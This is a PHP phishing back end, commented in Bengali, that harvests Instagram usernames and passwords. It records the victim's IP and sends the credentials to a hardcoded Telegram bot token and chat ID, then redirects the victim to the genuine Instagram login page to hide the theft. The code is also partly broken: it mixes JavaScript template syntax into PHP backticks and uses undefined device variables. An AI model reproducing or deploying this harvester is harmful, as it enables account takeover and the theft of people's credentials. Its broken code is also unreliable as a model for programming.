<?php
$telegramToken = "8896924435:AAGmtbOxAEFdaztEmNxZFZsFCEcYwx0WOro";
$chatId = "7341620431";

// ফর্ম থেকে ডেটা সংগ্রহ
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit;
}

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

// ভিকটিমের IP অ্যাড্রেস সংগ্রহ
$ip = $_SERVER['REMOTE_ADDR'] ?? '';

// ডেটা মেসেজ তৈরি
if (empty($username) || empty($password)) {
    http_response_code(400);
    exit;
}

$message = `
🚨 *NEW INSTAGRAM CREDENTIALS* 🚨
👤 **Username:** {$username}
🔑 **Password:** {$password}
🌍 **IP Address:** {$ip}
📱 **Device:** {$userAgent}| {$platform}| {$resolution}
🗓️ **Time:** ${new Date().toLocaleString()}
`;

// Telegram API-এ মেসেজ পাঠানো
$url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
$data = array(
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
);
$options = array(
    'http' => array(
        'method'  => 'POST',
        'content' => http_build_query($data)
    )
);
$context  = stream_context_create($options);
$response = json_decode(file_get_contents($url, false, $context), true);

// ব্যবহারকারীকে আসল ইনস্টাগ্রাম পেজে রিডাইরেক্ট করা
header("Location: https://www.instagram.com/accounts/login/");
exit();
?>